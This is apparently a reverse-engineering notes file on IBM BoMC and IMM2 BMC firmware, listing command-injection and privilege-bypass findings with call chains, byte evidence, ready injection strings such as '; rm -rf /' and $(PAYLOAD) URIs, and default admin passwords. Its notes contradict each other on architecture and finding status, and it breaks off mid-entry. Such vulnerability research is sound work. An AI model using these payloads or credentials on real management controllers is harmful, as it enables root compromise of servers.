"""
IBM BoMC (Blade and Office Management Center) Firmware Bundle RE
Targets: /media/cowboy/research/IBM-RE/collections/firmware/hmc/bomc/*.iso
         7042CR9_IMM470_uEFI261_DSA102.iso  (1.4GB)
         CR7BoMC_IMM560_UEFI211_DSA954_FC.iso  (2.0GB)
         CR7BoMC_IMM720_UEFI300_DSA954_FC.iso  (2.5GB)
         CR8BoMC_IMM560_UEFI211_DSA954_FC.iso  (2.0GB)
         CR8BoMC_IMM720_UEFI300_DSA954_FC.iso  (2.6GB)
         CR9BoMC_IMM370_UEFI232_DSA102_FC.iso  (1.4GB)
         CR9BoMC_IMM540_UEFI311_DSA105_FC.iso  (2.9GB)
Sessions:
  2026-10-25 (session 1): initial triage + deep RE of 7042CR9 ISO components
  2026-10-25 (session 2): IMM2 SH4 firmware extraction + libDataInterface.so RE
  2026-10-25 (session 3): libNexus.so (CIM provider) full exec call site sweep
Architecture: x86_64 Linux (ASU, rdmount/rdumount, LiveOS/squashfs)
              SH4 (Renesas SuperH-4 32-bit LSB) — IMM2 BMC OS + all IMM2 ELFs
              x86_64 UEFI (UEFI firmware, inside *.uxz packages)
              NOTE: IMM2 is SH4, NOT ARM Cortex-M. The .uxz payload is a Linux
              2.6.4 SH4 userspace. Architecture confirmed via ELF e_machine field
              and boot string "Booting machvec" (SH4-specific kernel boot path).

Analysis scope:
  Session 1: Linux x86_64 host-side ELFs extracted from 7042CR9_IMM470_uEFI261_DSA102.iso.
             All 7 BoMC ISOs share the same ASU/rdmount/rdumount binaries.
  Session 2: IMM2 firmware from CR9 variant (imm2_tcoo18m-3.00.upd, 82MB) extracted and
             mounted at /tmp/bomc_imm2/rootfs_mount. Deep RE of libDataInterface.so (SH4,
             4.7MB), the appweb module backing the IMM2 web UI.
"""

# ===========================================================================
# ISO INVENTORY
# ===========================================================================
BOMC_ISOS = {
    '7042CR9_IMM470_uEFI261_DSA102': {
        'path': '/media/cowboy/research/IBM-RE/collections/firmware/hmc/bomc/7042CR9_IMM470_uEFI261_DSA102.iso',
        'size_mb': 1411,
        'created': '2018-06-01',
        'components': {
            'IMM2': 'oem_fw_imm2_tcoe40a-4.70',   # ARM Cortex-M BMC firmware
            'UEFI': 'oem_fw_uefi_tbeg34n-2.61',   # x86_64 UEFI
            'DSA':  'oem_fw_dsa_dsaoa8n-10.2',    # Dynamic System Analysis diagnostic
        },
    },
    'CR7BoMC_IMM560_UEFI211': {
        'path': '/media/cowboy/research/IBM-RE/collections/firmware/hmc/bomc/CR7BoMC_IMM560_UEFI211_DSA954_FC.iso',
        'size_mb': 2000,
        'created': '(FC variant)',
    },
    'CR7BoMC_IMM720_UEFI300': {
        'path': '/media/cowboy/research/IBM-RE/collections/firmware/hmc/bomc/CR7BoMC_IMM720_UEFI300_DSA954_FC.iso',
        'size_mb': 2500,
        'created': '(FC variant)',
    },
    'CR8BoMC_IMM560_UEFI211': {
        'path': '/media/cowboy/research/IBM-RE/collections/firmware/hmc/bomc/CR8BoMC_IMM560_UEFI211_DSA954_FC.iso',
        'size_mb': 2000,
        'created': '(FC variant)',
    },
    'CR8BoMC_IMM720_UEFI300': {
        'path': '/media/cowboy/research/IBM-RE/collections/firmware/hmc/bomc/CR8BoMC_IMM720_UEFI300_DSA954_FC.iso',
        'size_mb': 2600,
        'created': '(FC variant)',
    },
    'CR9BoMC_IMM370_UEFI232': {
        'path': '/media/cowboy/research/IBM-RE/collections/firmware/hmc/bomc/CR9BoMC_IMM370_UEFI232_DSA102_FC.iso',
        'size_mb': 1400,
        'created': '(FC variant)',
    },
    'CR9BoMC_IMM540_UEFI311': {
        'path': '/media/cowboy/research/IBM-RE/collections/firmware/hmc/bomc/CR9BoMC_IMM540_UEFI311_DSA105_FC.iso',
        'size_mb': 2900,
        'created': '(FC variant)',
    },
}

# ===========================================================================
# ISO STRUCTURE (from 7042CR9 — representative for all 7 ISOs)
# ===========================================================================
ISO_STRUCTURE = {
    'ASU/asu64': {
        'format': 'ELF64 x86_64 ET_EXEC dynamically linked, NOT stripped',
        'size_bytes': 21156222,
        'build_date': '2015-03-31',
        'description': 'IBM Advanced Settings Utility — root-running CLI tool for UEFI/IMM configuration',
        'func_starts': 26661,
        'plt_entries': 330,
        'call_edges': 313248,
        'sha256_prefix': '908b5297ffc6efbb',
    },
    'ASU/rdcli-x86_64/rdmount': {
        'format': 'ELF64 x86_64 ET_EXEC dynamically linked, NOT stripped',
        'size_bytes': 6681314,
        'build_date': '2015-03-31',
        'description': 'IBM Remote Disk Mount client — mounts ISO images from IMM virtual media',
        'func_starts': 10783,
        'plt_entries': 338,
        'call_edges': 56180,
        'sha256_prefix': '00bc016bf26d515b',
    },
    'ASU/rdcli-x86_64/rdumount': {
        'format': 'ELF64 x86_64 ET_EXEC dynamically linked, NOT stripped',
        'size_bytes': 79744,
        'build_date': '2015-03-31',
        'description': 'IBM Remote Disk Unmount — companion to rdmount',
    },
    'LiveOS/squashfs.img': {
        'format': 'Squashfs 4.0 Linux rescue environment',
        'size_bytes': 146391040,
        'description': 'DSA Linux bootable environment (not analyzed in this session)',
    },
    'updates/imm2/oem_fw_imm2_tcoe40a-4.70_anyos_noarch.uxz': {
        'format': 'IBM UXZ archive (XZ-compressed payload container)',
        'size_bytes': 90395729,
        'description': 'IMM2 ARM Cortex-M BMC firmware v4.70 (not extracted — uxz format)',
        'status': 'DEFERRED — requires uxz extraction to access ARM binary payload',
    },
    'updates/uefi/oem_fw_uefi_tbeg34n-2.61_anyos_32-64.uxz': {
        'format': 'IBM UXZ archive',
        'size_bytes': 7594562,
        'description': 'UEFI firmware v2.61 for IBM BladeCenter H (not extracted)',
        'status': 'DEFERRED — requires uxz extraction',
    },
}


# ===========================================================================
# IMM2 FIRMWARE INVENTORY (SH4)
# ===========================================================================
IMM2_FIRMWARE = {
    'container': {
        'path': '/tmp/bomc_imm2/imm2_tcoo18m-3.00.upd',
        'format': 'IBM IMM2 .upd: 0xDEADC0DE header + outer TAR at 0x1605 + inner imm2.tar at 0x2205',
        'size_bytes': 85524480,
        'rootfs_gz_offset': 0x3a3805,
        'rootfs_gz_size': 72106821,
        'rootfs_ext3_size': 268435456,  # 256MB decompressed
        'mount_point': '/tmp/bomc_imm2/rootfs_mount',
    },
    'os': {
        'arch': 'SH4 (Renesas SuperH-4) 32-bit LSB',
        'kernel': 'Linux 2.6.4',
        'exec_wrappers': 'libpm_lib.so: secure_system, proc_system, proc_popen, secure_popen',
        'exec_mechanism': 'fork() + execve("/bin/sh", ["/bin/sh", "-c", cmd]) — shell IS invoked',
        'setuid_binaries': ['SerRedir (setuid+setgid)', 'unix_chkpwd (setuid)', 'clish (setuid)'],
    },
    'key_binaries': {
        'libDataInterface.so': {
            'path': '/tmp/bomc_imm2/targets/libDataInterface.so',
            'size_bytes': 4921884,
            'arch': 'SH4 32-bit LSB, stripped, dynamically linked',
            'description': 'appweb module backing IMM2 web UI; handles all FunctionInterface calls',
            'text_va': 0x304a0,
            'text_size': 0x1b3e00,
            'got_base': 0x4c0494,
            'plt_range': (0x2a0a4, 0x3044c),
            'exec_imports': ['proc_system', 'proc_popen', 'secure_popen', 'secure_system'],
            'direct_exec_callers': {
                '0x1370c0': 'generateKVMLaunchScript(std::string, vector*, vector*) → secure_popen',
                '0x1889c0': 'Get_FFDC_status(int, vector*) → secure_popen',
                '0x1a9020': 'SA_Get_FFDC_status(int, std::string, ...) → proc_system + proc_popen',
                '0x1aaa20': 'SA_Generate_FFDC_data(int, vector*) → proc_system',
                '0x1acea0': 'SA_ExportProblems(std::string, unsigned, ...) → proc_system',
            },
            'hardcoded_exec_calls': [
                '/bin/sh -c "/bin/rm -rf /usr/local/imm_www5/designs/imm/ffdc/"',
                '/bin/sh -c "ls -l /pstorage/imm_dump/ffdc.tgz | awk ..."',
                '/bin/mkdir /usr/local/imm_www5/designs/imm/ffdc/',
                '/bin/ln -s /pstorage/imm_dump/ffdc.tgz /usr/local/...',
                '/bin/mkdir /usr/local/imm_www5/designs/imm/sa/',
            ],
        },
        'libpm_lib.so': {
            'arch': 'SH4 stripped',
            'exec_wrappers': {
                'secure_system': {'va': 0x57a0, 'calls': 'async_secure_system_nonblocking'},
                'proc_system': {'va': 0x4dc0, 'calls': 'proc_system_nonblocking'},
                'proc_popen': {'va': 0x4c40, 'calls': 'proc_popen_nonblocking'},
                'async_secure_system': {'va': 0x4580, 'size_bytes': 616, 'mechanism':
                    'fork() + execve("/bin/sh",["/bin/sh","-c",cmd]) confirmed by import list'},
            },
            'confirms_shell_invocation': (
                'libpm_lib.so imports execve@GLIBC_2.2 + fork@GLIBC_2.2 + waitpid@GLIBC_2.2. '
                'Does NOT import system@GLIBC_2.2. Shell is invoked as: '
                'execve("/bin/sh", ["/bin/sh", "-c", cmd_string]). '
                'Shell metacharacters in cmd_string are interpreted.'
            ),
        },
        'SerRedir': {
            'path': '/tmp/bomc_imm2/targets/SerRedir',
            'size_bytes': 18196,
            'arch': 'SH4 32-bit LSB, ET_EXEC, setuid+setgid root:root',
            'description': 'Serial console redirection daemon — proxies serial port I/O',
            'exec_imports': 'NONE — no system/popen/execve/fork in import list',
            'verdict': 'SAFE',
            'analysis': (
                'Imports: open/read/write/close/select/ioctl, tcgetattr/tcsetattr/cfsetospeed/cfsetispeed, '
                'sigaction/sigprocmask/sigaddset, dlopen/dlsym/dlclose, IPMI_DoIPMICmd, '
                'GetVarValueSTRING/GetVarValueBOOL/GetVarValueUINT/SetVarValueBOOL, '
                'aim_config_get_str, strncpy/__snprintf_chk, __stack_chk_fail. '
                'Zero exec-class imports. '
                'dlopen("/lib/libnvram.so") — hardcoded path, not injectable. '
                'IPMI_DoIPMICmd: r4=0 (NetFn=Chassis), r5=2 (Cmd=GetChassisStatus) — hardcoded immediates. '
                'strncpy calls all use n=20 explicit limit; stack canary active. '
                'getenv("USER") value → aim_config_set_str("SerRedirCurUser") → fork → '
                'prctl(PR_SET_DUMPABLE,1) → execv("/sbin/SerRedir") — execv path hardcoded. '
                'Setuid+setgid needed for raw /dev/ttySC0 access, not for privilege escalation. '
                'NO exploitable finding.'
            ),
        },
        'clish': {
            'path': '/tmp/bomc_imm2/targets/clish',
            'size_bytes': 51304,
            'arch': 'SH4 32-bit LSB, ET_EXEC, setuid root (rwsr-xr-x)',
            'description': 'IBM CLI shell (clish-based) — restricted command interface for IMM2',
            'exec_imports': ['fork', 'execv'],
            'verdicts': 'TWO CANDIDATES — see BOMC-IMM2-003',
            'analysis': (
                'fork+execv(hardcoded "/sbin/SerRedir") — no PATH injection, no exec of user input. '
                'waitpid after fork (child tracked). '
                'Network: socket(AF_UNIX,SOCK_STREAM,0) + connect → Unix socket CLI daemon. '
                'getenv("PRIVILEGES") @ 0x40304a → r11; getenv("USER") @ 0x403054 → r10. '
                'strtol(r11=PRIVILEGES, NULL, 10) → sends privilege integer to CLI daemon via write(). '
                'strcmp(getenv("USER"), "immroot") @ 0x403822/0x403824: '
                '  tst r0,r0; bf 0x403830 — T=0 (not equal) → 0x403830 → puts("no username or privileges."); '
                '  T=1 (USER==immroot) → fall-through → continues to fork+execv. '
                'Both PRIVILEGES and USER checks are CLIENT-SIDE only. '
                'Exploitation: set USER=immroot and PRIVILEGES=15 before executing clish. '
                'If PermitUserEnvironment enabled in SSH config → direct via SSH. '
                'Otherwise requires prior shell on IMM2. '
                'Stack canary active. C++ STL (libstdc++) present.'
            ),
        },
        'libNexus.so': {
            'path': '/tmp/bomc_imm2/targets/libNexus.so',
            'size_bytes': 2802204,
            'arch': 'SH4 32-bit LSB, stripped, dynamically linked',
            'description': 'Main CIM provider for IMM2 BMC — WBEM/WS-Management over HTTPS port 5989',
            'plt_va': 0x000d5864,
            'plt_stub_size': 28,  # 28-byte stubs (24-byte resolver + 4-byte padding + stubs)
            'plt_formula': 'stub_va(n) = 0xd5880 + n * 28',
            'got_base': 0x002b6410,
            'text_range': (0x000e62e0, 0x000e62e0 + 0x17be60),
            'rodata_range': (0x00262178, 0x00296BE4),
            'rela_plt_entries': 2435,
            'rela_plt_entsize': 12,  # SHT_RELA (type=4), not SHT_REL
            'exec_imports': [
                'proc_system', 'proc_popen', 'async_secure_system', 'secure_system',
            ],
            'total_exec_call_sites': 53,
            'functions_with_exec_calls': 18,
            'analysis_complete': True,
            'safe_functions': [
                'BMU funcs 0x0fae54/0x0fb5ae/0x0fbb8e/0x0fbff0/0x0fcbb2/0x0fd192/0x0fd7b0/0x0fdc14: '
                '/bin/ds rm|cp with hardcoded filenames; firetool --pf-* with %d only',
                '0x0012e252 IBM_DiagnosticService_InstAgent_Run + ResetCIM: sfcbd restart, '
                'chmod sfcbd, mv dracut-hack — all hardcoded',
                '0x0013bbf2 IBM_CertificateManager_InstAgent_CreateKeyPair: '
                '/etc/sysapps_script/sshd.startup genkey — hardcoded',
                '0x0013dcb0 IBM_CertificateManager_InstAgent_ImportCertificate: openssl/cp/rm use '
                'mkstemp temp paths; sysprofserver.sh %s = service name from hardcoded constants '
                '(ldapclient/ldapserver/storekey-client/storekey-server)',
                '0x00155bb2 run_encap_cmd: /bin/sh /bin/encapsulation-lite-utility.sh — hardcoded',
                '0x00165b70 IBM_TextRedirectionService_InstAgent_GetAuthenticationToken: '
                '/bin/avct_control privlvl --value=%s,0x%x — session key is server-generated',
                '0x00181170 SSH/telnetd/sfcbd restart handler: all restart scripts hardcoded',
                '0x00195e10 port-forwarding status: firetool --status-pf pipeline — hardcoded',
                '0x001985dc CIM_PublicKeyCertificate_InstAgent_Init: ssh-keygen hardcoded',
                '0x001a1672/0x001a192e ConfigurationDataService: /bin/system-profiles -e --check — hardcoded',
                '0x001a44d0 system profiles enable/disable: /bin/system-profiles -e/-d — hardcoded',
            ],
        },
        'seclvd': {
            'description': 'Security level daemon — handles SSL/TLS, SSH, service restart',
            'verdict': 'SAFE — all exec calls use hardcoded strings, no user-controlled input',
        },
    },
}


# ===========================================================================
# CONFIRMED FINDINGS
# ===========================================================================
FINDINGS = {
    'BOMC-IMM2-001': {
        'binary': 'IMM2 SH4 rootfs: /usr/local/lib/appweb/libDataInterface.so',
        'cwe': 'CWE-78',
        'severity': 'HIGH',
        'verdict': 'CONFIRMED',
        'title': 'IMM2 KVM launch: ipAddress HTTP param → secure_popen(launch_kvm.sh -i <ip>) — authenticated web RCE',

        'attack_surface': (
            'IMM2 web UI (HTTPS port 443). Requires authenticated session (any valid IMM2 credentials). '
            'Exploitable by: IMM2 web users with KVM access privilege (default for Operator+ roles). '
            'The KVM session initiation request triggers generateKVMLaunchScript.'
        ),

        'call_chain': (
            'HTTP POST/GET → appweb → FunctionInterface dispatch → generateKVMLaunchScript()\n'
            '\n'
            'generateKVMLaunchScript(std::string args, vector* out1, vector* out2) at VA 0x1370c0:\n'
            '  1. Parses JSON args string — extracts ipAddress, ipveFormat, webPort, kvmType, etc.\n'
            '  2. Builds launch command: "/usr/local/bin/launch_kvm.sh -i <ipAddress> -t k32 ..."\n'
            '     (ipAddress from HTTP request, placed in command string WITHOUT sanitization)\n'
            '  3. 0x139f1c: mov.l @(r0,r1), r4   ; r4 = command string c_str()\n'
            '  4. 0x139f1a: mov.l 0x13a070, r5   ; r5 = "r" (popen read mode)\n'
            '  5. 0x139f1e: bsrf r2               ; call secure_popen(cmd, "r")\n'
            '\n'
            'secure_popen (via libpm_lib.so) → proc_popen_nonblocking()\n'
            '  → fork() + execve("/bin/sh", ["/bin/sh", "-c", cmd])\n'
            '  → /bin/sh interprets metacharacters in the full command string\n'
            '\n'
            'SECONDARY injection inside launch_kvm.sh (shell script level):\n'
            '  HOST_IP=$OPTARG (-i option) — then USED UNQUOTED:\n'
            '  Line 36: isIPv6=`echo $HOST_IP | grep -q -e ":" || echo no`\n'
            '  Line 71: BRACKET=`echo $HOST_IP | grep -q -e "^\\[.*" || echo no`\n'
            '  Line 74: HOST_IP_NO_PORT=`echo $HOST_IP | tr \':\' \' \' | awk \'{print $1}\'`\n'
            '  Backtick expressions with unquoted $HOST_IP → command injection inside script'
        ),

        'exploitation': (
            'Primary injection (at proc invocation level — most reliable):\n'
            '  ipAddress = "127.0.0.1; /bin/busybox sh -c \'id>/tmp/pwn\' #"\n'
            '  Command: /usr/local/bin/launch_kvm.sh -i 127.0.0.1; /bin/busybox sh ...\n'
            '  Shell parses the ";" as command separator → executes arbitrary payload\n'
            '\n'
            'Secondary injection (inside launch_kvm.sh, line 36):\n'
            '  ipAddress containing `$(cmd)` or backtick expressions\n'
            '  e.g., ipAddress = "127.0.0.1`id>/tmp/pwn`"\n'
            '  → isIPv6=`echo 127.0.0.1`id>/tmp/pwn`` → id>/tmp/pwn executes'
        ),

        'byte_verified': True,
        'byte_evidence': [
            {'binary': 'libDataInterface.so',
             'va': 0x139f1e, 'bytes': '03 02',
             'label': 'bsrf r2 — branch-and-link to secure_popen PLT stub'},
            {'binary': 'libDataInterface.so',
             'va': 0x139f14, 'bytes': '55 d2',
             'label': 'mov.l @(0x55, PC), r2 — loads bsrf displacement from constant pool'},
            {'binary': 'libDataInterface.so',
             'va': 0x13a06c, 'bytes': '4e 38 ef ff',
             'label': 'pool entry: -1099698 → bsrf target = 0x2d770 (secure_popen PLT)'},
            {'binary': 'libDataInterface.so',
             'va': 0x2d770, 'bytes': '04 d0',
             'label': 'secure_popen PLT stub: mov.l @(4,PC), r0; loads GOT offset 0x7dc'},
            {'binary': 'libDataInterface.so',
             'va': 0x13a070, 'bytes': None,
             'label': 'pool entry points to string "r" — popen read mode (VA 0xRODATA)'},
            {'binary': 'launch_kvm.sh (shell script)',
             'line': 36,
             'label': 'isIPv6=`echo $HOST_IP | grep ...` — HOST_IP (= -i optarg) unquoted in backtick'},
        ],
        'verified_targets': {
            '0x139f1e bsrf r2': 'PLT stub 0x2d770 → secure_popen (GOT offset 0x7dc, GOT VA 0x4c0c70)',
        },
        'script_path': '/usr/local/bin/launch_kvm.sh (mounted from IMM2 SH4 rootfs)',
    },

    'BOMC-IMM2-002': {
        'binary': 'IMM2 SH4 rootfs: /usr/lib/provider/libNexus.so + /lib/libxferd.so',
        'cwe': 'CWE-78',
        'severity': 'HIGH',
        'verdict': 'CONFIRMED',
        'title': (
            'IMM2 CIM firmware update URI → xferd_parse_uri (no sanitization) → '
            'curl SFTP/TFTP cmd → async_secure_system → /bin/sh — authenticated admin RCE'
        ),

        'attack_surface': (
            'CIM/WS-Management over HTTPS port 5989 on IMM2. '
            'Requires authenticated Supervisor/Administrator credentials. '
            'CIM method: CIM_SoftwareInstallationService.InstallFromURI(URI="sftp://HOST/PATH"). '
            'IMM2 default: admin password = "PASSW0RD" or "admin" on factory-reset units.'
        ),

        'call_chain': (
            'CIM InstallFromURI request (HTTPS:5989) → func@0x00141a10 in libNexus.so\n'
            '\n'
            'Step 1: func@0x00141a10 calls xferd_parse_uri(user_URI, &uri_out)\n'
            '  bsrf r3 at 0x00141afc → PLT stub 0x000dd5d8 → xferd_parse_uri@libxferd.so\n'
            '\n'
            'xferd_parse_uri @ 0x000061a0 in libxferd.so (1052 bytes):\n'
            '  1. uriParseUriA(uri_string, &uri_struct) — RFC 3986 parser, no shell sanitization\n'
            '  2. strncpy/strncpy_chk — copies host, path, creds RAW into output struct\n'
            '  3. sscanf(creds, "%[^:]:%s", username, password) — split creds on first colon\n'
            '  4. strtol(port_str) — parse port\n'
            '  RFC 3986 sub-delimiters (valid in host + path): ; $ & ( ) * ! — all shell metacharacters\n'
            '  NO strpbrk/strchr/escape — zero sanitization\n'
            '\n'
            'Step 2: func@0x00141a10 builds curl command via snprintf:\n'
            '  SFTP: "/usr/bin/curl -o %s -u %s:%s sftp://%s%s:%d/%s -k --connect-timeout 1800 --stderr %s"\n'
            '         (format string at rodata VA 0x00274c24)\n'
            '  TFTP: "/usr/bin/curl -o %s tftp://%s%s:%d/%s --tftp-blksize 8192 ..."\n'
            '  %s for path (position 7 in SFTP cmd) = raw path from xferd_parse_uri\n'
            '\n'
            'Step 3: func@0x00141a10 calls async_secure_system(curl_cmd)\n'
            '  bsrf r3 at 0x00141f2c → PLT stub 0x000e2d74 → async_secure_system@libpm_lib.so\n'
            '  → fork() + execve("/bin/sh", ["/bin/sh", "-c", curl_cmd])\n'
        ),

        'exploitation': (
            'URI: sftp://legitimate.host/fw.bin;$(PAYLOAD)\n'
            '  PAYLOAD injected via $(cmd) in path (RFC 3986 path allows $ ( ))\n'
            '  Result cmd: /usr/bin/curl ... sftp://legitimate.host:22/fw.bin;$(PAYLOAD) -k ...\n'
            '  Shell expands $(PAYLOAD), curl proceeds to legitimate host (ignoring the ;)\n'
            '\n'
            'Simpler: sftp://legitimate.host/fw.bin;id\n'
            '  Shell splits at ";": runs curl, then "id -k --connect-timeout ..." (id executes)\n'
            '\n'
            'URI via host component: sftp://$(touch /tmp/pwned).host/fw.bin\n'
            '  Shell expands $(touch /tmp/pwned) — but space in host requires quoting trick\n'
            '  Practical: sftp://$(id).x/fw.bin — id output in DNS lookup attempt\n'
            '\n'
            'Runs as IMM2 root. Network accessible (HTTPS port 5989). Admin auth required.'
        ),

        'byte_verified': True,
        'byte_evidence': [
            {'binary': 'libNexus.so',
             'va': 0x00141afc, 'bytes': '03 03',
             'label': 'bsrf r3 — call to xferd_parse_uri PLT stub 0xdd5d8'},
            {'binary': 'libNexus.so',
             'va': 0x00141c08, 'bytes': 'd8 ba f9 ff',
             'label': 'pool entry = -410920 → target = 0x141b00 - 0x64528 = 0x0dd5d8'},
            {'binary': 'libNexus.so',
             'va': 0x000dd5d8, 'bytes': '04 d0 ce 00',
             'label': 'xferd_parse_uri PLT stub: d004 (mov.l @(4,PC),r0) + 00ce'},
            {'binary': 'libNexus.so',
             'va': 0x00141f2c, 'bytes': '03 03',
             'label': 'bsrf r3 — call to async_secure_system PLT stub 0xe2d74'},
            {'binary': 'libNexus.so',
             'va': 0x00141fcc, 'bytes': '44 0e fa ff',
             'label': 'pool entry = -389564 → target = 0x141f30 - 0x5f1bc = 0x0e2d74'},
            {'binary': 'libNexus.so',
             'va': 0x000e2d74, 'bytes': '04 d0 ce 00',
             'label': 'async_secure_system PLT stub: d004 + 00ce'},
            {'binary': 'libNexus.so (rodata)',
             'va': 0x00274c24, 'bytes': '2f 75 73 72 2f 62 69 6e 2f 63 75 72 6c',
             'label': 'SFTP curl format string: /usr/bin/curl -o %s -u %s:%s sftp://%s%s:%d/%s ...'},
        ],
        'verified_call_targets': {
            '0x00141afc bsrf r3': 'PLT stub 0x000dd5d8 → xferd_parse_uri@libxferd.so',
            '0x00141f2c bsrf r3': 'PLT stub 0x000e2d74 → async_secure_system@libpm_lib.so',
        },
        'libxferd_analysis': {
            'binary': '/lib/libxferd.so',
            'size_bytes': 42580,
            'xferd_parse_uri_va': 0x000061a0,
            'xferd_parse_uri_size': 1052,
            'calls': ['uriParseUriA (uriparser library, RFC 3986, no shell sanitization)',
                      'strncpy × 4 (raw component copy)',
                      'sscanf "%[^:]:%s" (creds split)',
                      'strtol (port)', 'strcmp × 3 (scheme matching: sftp/tftp/http/https)',
                      'uriFreeUriMembersA × 5 (error paths)'],
            'sanitization_calls': 'NONE — no strpbrk, strchr, escape, or metachar filter of any kind',
            'rfc3986_injection_chars': '; $ & ( ) * ! — all valid in path + reg-name sub-delimiters',
        },
    },

    'BOMC-RDM-001': {
        'binary': 'ASU/rdcli-x86_64/rdmount',
        'cwe': 'CWE-78',
        'severity': 'HIGH',
        'verdict': 'CONFIRMED',
        'title': 'rdmount -d drivePath → system("df -h |grep " + drivePath) — CLI argument command injection',

        # ── Full taint chain (byte-verified) ──────────────────────────────
        'call_chain': (
            'main() → RdMountUI::parse() [0x423fd6]\n'
            '  getopt() loop dispatch via jump table at 0x424059\n'
            '  case \'d\' (option -d, index 37 in table at 0x64dcf0):\n'
            '    0x424063: mov rdi, [rip+0x43e35e]   ; load optarg (CLI -d value)\n'
            '    0x42406a: call strdup@plt            ; strdup(optarg) → rdx\n'
            '    0x424076: mov [rax+0x28], rdx        ; this->drivePath = strdup(optarg)\n'
            '  ...\n'
            '  0x424151: lea rdi, [rbp-0x30]          ; string buf\n'
            '    0x424155: mov esi, 0x64dc66           ; "df -h |grep "\n'
            '    0x42415a: call string::append         ; buf = "df -h |grep "\n'
            '    0x424163: mov rsi, [rax+0x28]         ; rsi = this->drivePath  ← USER INPUT\n'
            '    0x42416b: call string::append         ; buf += drivePath\n'
            '    0x424174: call string::c_str\n'
            '    0x42417c: call system@plt             ; system("df -h |grep <drivePath>")\n'
            '  Full command: system("df -h |grep " + argv[-d])'
        ),

        'exploitation': (
            'Command injection via unquoted drivePath appended to shell pipeline:\n'
            '  rdmount -d "$(id>/tmp/pwn)" <server>\n'
            '    → system("df -h |grep $(id>/tmp/pwn)")\n'
            '    → executes: id>/tmp/pwn as current user\n\n'
            'Alternate: pipe injection (| is already present in the command prefix)\n'
            '  rdmount -d "x; evil_command" <server>\n'
            '    → system("df -h |grep x; evil_command")\n\n'
            'rdmount runs as root (requires root for IPMI device access per IBM docs).\n'
            'If called from a script that passes a server-derived path as -d, '
            'a rogue IMM can supply a malicious drivePath → RCE as root on the host.'
        ),

        'byte_verified': True,
        'byte_evidence': [
            {'va': 0x424063, 'n': 7,
             'bytes': '48 8b 3d 5e e3 43 00',
             'label': 'mov rdi, [rip+0x43e35e]  — loads optarg global (CLI arg value)'},
            {'va': 0x42406a, 'n': 5,
             'bytes': 'e8 31 a7 fe ff',
             'label': 'call 0x40e7a0 = strdup@plt  — duplicates CLI arg'},
            {'va': 0x424076, 'n': 4,
             'bytes': '48 89 50 28',
             'label': 'mov [rax+0x28], rdx  — stores strdup(optarg) in drivePath field'},
            {'va': 0x424155, 'n': 5,
             'bytes': 'be 66 dc 64 00',
             'label': 'mov esi, 0x64dc66  — "df -h |grep " command base'},
            {'va': 0x424163, 'n': 4,
             'bytes': '48 8b 70 28',
             'label': 'mov rsi, [rax+0x28]  — loads drivePath (user-controlled) as second append arg'},
            {'va': 0x42417c, 'n': 5,
             'bytes': 'e8 8f aa fe ff',
             'label': 'call 0x40ec10 = system@plt  — SINK; executes "df -h |grep <drivePath>"'},
        ],

        'verified_call_targets': {
            '0x42406a': '0x40e7a0 = strdup@plt',
            '0x42417c': '0x40ec10 = system@plt',
        },
    },
}


# ===========================================================================
# CANDIDATE FINDINGS (taint trace needed to confirm)
# ===========================================================================
CANDIDATES = {
    'BOMC-RDM-001': {
        'binary': 'ASU/rdcli-x86_64/rdmount',
        'va': 0x423fd6,
        'cwe': 'CWE-78',
        'severity': 'MEDIUM',
        'title': 'rdmount RdMountUI::parse() calls system("df -h |grep " + mount_path) without sanitization',
        'sink': 'system() at 0x42417c',

        # ── Call chain ─────────────────────────────────────────────────────
        'call_chain': (
            'RdMountUI::parse() [0x423fd6]\n'
            '  → string.append("df -h |grep ")\n'
            '  → string.append(rax+0x28)  ; field from parsed data — likely mount path from CLI\n'
            '  → system(string.c_str())   [0x42417c]\n'
            '  Full command: system("df -h |grep <mount_path>") with NO quote wrapping'
        ),

        # ── Injection condition ────────────────────────────────────────────
        'injection_condition': (
            'The mount_path is appended directly to the shell command with no quoting. '
            'The | in "df -h |grep " already starts a pipeline; appending '
            '"; rm -rf /" or "` id`" executes arbitrary commands. '
            'rdmount takes a server address + mount path as CLI args: '
            '  rdmount <server> <path> [options]. '
            'If <path> is attacker-influenced (e.g. a server returns a path in a protocol response '
            'or the caller script passes user input), this is pre-auth RCE via command injection.'
        ),

        'needs': (
            'Confirm that rax+0x28 in parse() derives from the CLI mount path argument '
            'and not a trusted internal source. '
            'Trace RdMountUI::parse() callers to understand how the object is populated.'
        ),

        'direct_system_wrapper': {
            'function': 'Linux::execCmd(char*)',
            'va': 0x42b994,
            'code': 'system(char* cmd) — direct pass-through wrapper',
            'risk': 'Any caller that passes user-influenced data to execCmd achieves command injection.',
        },

        'byte_evidence': [
            {'va': 0x424155, 'n': 5, 'expected_asm': 'mov esi, 0x64dc66  ; "df -h |grep "',
             'label': 'command base "df -h |grep " appended to string'},
            {'va': 0x42415b, 'n': 5, 'expected_asm': 'mov rax, [rbp-0x38]  ; parsed object',
             'label': 'load parsed object pointer'},
            {'va': 0x424163, 'n': 4, 'expected_asm': 'mov rsi, [rax+0x28]  ; mount path field',
             'label': 'mount_path loaded from field+0x28 of parsed object'},
            {'va': 0x42416b, 'n': 5, 'expected_asm': 'call string::append',
             'label': 'append mount_path to command string'},
            {'va': 0x424174, 'n': 5, 'expected_asm': 'call string::c_str',
             'label': 'get C string pointer for system()'},
            {'va': 0x42417c, 'n': 5, 'expected_asm': 'call system@plt',
             'label': 'system() call — SINK'},
        ],
        'byte_verified': False,
    },

    'BOMC-IMM2-003': {
        'binary': 'IMM2 SH4 rootfs: /bin/clish (setuid root) + /sbin/clid (CLI daemon)',
        'cwe': 'CWE-807',
        'severity': 'MEDIUM',
        'verdict': 'CONFIRMED',
        'title': (
            'IMM2 clish setuid binary: strtol(getenv("PRIVILEGES")) sent to clid daemon '
            'without credential check + strcmp(getenv("USER"),"immroot") client-side guard bypass'
        ),

        'attack_surface': (
            'IMM2 SSH access as any authenticated user OR prior shell on IMM2. '
            'sshd_config-immcli: PermitUserEnvironment=no (confirmed) → SSH env var injection '
            'NOT possible without prior shell. '
            'Attack path: shell via BOMC-IMM2-001 or BOMC-IMM2-002 → set USER=immroot '
            'PRIVILEGES=15 → run /bin/clish → admin CLI session.'
        ),

        'call_chain': (
            '--- clish side ---\n'
            'main() at 0x402600 → func@0x402fb0\n'
            '\n'
            'getenv("PRIVILEGES") at 0x40304a → r11 (privilege level string)\n'
            'getenv("USER") at 0x403054 → r10 (username string)\n'
            '\n'
            'strtol(r11, NULL, 10) at 0x403128 → r3 (privilege integer)\n'
